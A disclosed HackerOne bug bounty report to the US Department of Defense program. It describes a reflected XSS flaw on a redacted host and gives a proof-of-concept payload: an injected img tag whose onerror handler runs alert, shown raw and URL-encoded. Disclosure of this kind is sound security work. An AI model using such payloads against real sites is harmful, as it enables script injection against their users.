# xss on https://███████(█████████ parameter)

## Report Details
- **Report ID**: 1143780
- **URL**: https://hackerone.com/reports/1143780
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-03-31T23:34:21.510Z
- **Disclosed**: 2021-07-29T19:39:27.606Z

## Reporter
- **Username**: fiveguyslover
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Greetings, i've found an xss on https://████████(██████████ parameter)

link :████████.█████████████=%22/%3E%3Cimg%20src=x%20onerror=(alert)(1)%3E
Payload : 
```
"/><img src=x onerror=(alert)(1)/>
```
████████

best regards,
frenchvlad

## Impact

A reflected XSS vulnerability happens when the user input from a URL or POST data is reflected on the page without being stored, thus allowing the attacker to inject malicious content.

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
link :██████████████████.████████████=%22/%3E%3Cimg%20src=x%20onerror=(alert)(1)%3E

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
